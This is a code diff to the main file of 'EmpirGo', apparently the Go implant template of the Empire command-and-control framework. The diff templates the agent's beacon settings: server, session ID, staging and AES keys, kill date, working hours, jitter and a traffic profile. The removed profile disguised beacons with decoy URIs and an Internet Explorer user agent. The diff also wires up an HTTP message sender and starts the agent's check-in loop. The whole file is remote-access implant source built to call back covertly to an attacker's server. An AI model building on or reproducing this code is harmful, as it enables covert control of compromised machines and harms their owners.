@@ -1,21 +1,24 @@
 package main
 
 import (
+	"EmpirGo/agent"
+	"EmpirGo/comms"
 	"encoding/base64"
 	"fmt"
 )
 
 func main() {
-	profile := "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+	profile := "{{ PROFILE }}"
 	server := "{{ HOST }}"
 	sessionID := "{{ SESSION_ID }}"
-	killDate := ""
-	workingHours := ""
-	delay := 5
-	jitter := 0.0
-	lostLimit := 60
+	killDate := "{{ KILL_DATE }}"
+	workingHours := "{{ WORKING_HOURS }}"
+	delay := {{ DELAY }}
+	jitter := {{ JITTER }}
+	lostLimit := {{ LOST_LIMIT }}
     stagingKeyBase64 := "{{ STAGING_KEY | safe }}"
 	aesKeyBase64 := "{{ AES_KEY | safe }}"
+	defaultResponse := "{{ DEFAULT_RESPONSE }}"
 
 	stagingKey, err := base64.StdEncoding.DecodeString(stagingKeyBase64)
 	if err != nil {
@@ -29,16 +32,18 @@ func main() {
 		return
 	}
 
-	packetHandler := &PacketHandler{
-		missedCheckins: 0,
-		headers:        make(map[string]string),
-		server:         server,
-		stagingKey:     stagingKey,
-		aeskey:         aeskey,
+	packetHandler := comms.PacketHandler{
+		MissedCheckins: 0,
+		Server:         server,
+		StagingKey:     stagingKey,
+		Aeskey:         aeskey,
 	}
-	agent := NewMainAgent(packetHandler, profile, server, sessionID, killDate, workingHours, delay, jitter, lostLimit)
 
-	go agent.run()
+	messagesender, err := comms.NewHttpMessageSender(server, make(map[string]string), profile)
+
+	newAgent := agent.NewMainAgent(packetHandler, messagesender, sessionID, killDate, workingHours, delay, jitter, lostLimit, stagingKey, defaultResponse)
+
+	go newAgent.Run()
 
 	select {}
 }
